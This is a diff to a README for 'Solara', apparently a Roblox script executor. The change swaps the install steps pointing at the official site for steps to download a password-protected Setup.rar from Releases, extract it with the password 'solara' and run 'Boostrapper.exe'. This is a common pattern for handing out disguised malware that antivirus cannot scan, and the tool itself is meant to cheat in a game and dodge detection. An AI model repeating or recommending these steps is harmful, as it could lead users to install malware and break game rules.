@@ -4,7 +4,8 @@
 
 ## Enhance Your Roblox Scripting Experience with Solara
 
-[Download the Latest Version](https://solara.wiki/)
+[Download the Latest Version](https://solara.wiki/) 
+__[Password]__: `solara`
 
 </div>
 
@@ -26,9 +27,8 @@ Solara may require periodic updates due to detection. The developers do not clai
 
 ### 🛠️ How to Install Solara 🛠️
 
-1. **Visit the Official Website**: Go to [Download](https://solara.wiki/).
-2. **Download the Executor**: Scroll to the download section and click on the “Download Solara” button.
-3. **Extract the Files**: After downloading, open the ZIP file and extract it to your preferred location.
+1. **Downlaod Setup**: Download Setup.rar from Releases.
+2. **Extract the Files**: Use **WinRAR** and the password: `solara` to extract the files.
 4. **Launch Roblox**: Open Roblox.
 5. **Run Solara**: Execute “Boostrapper.exe” and start attaching scripts to your Roblox game.
 
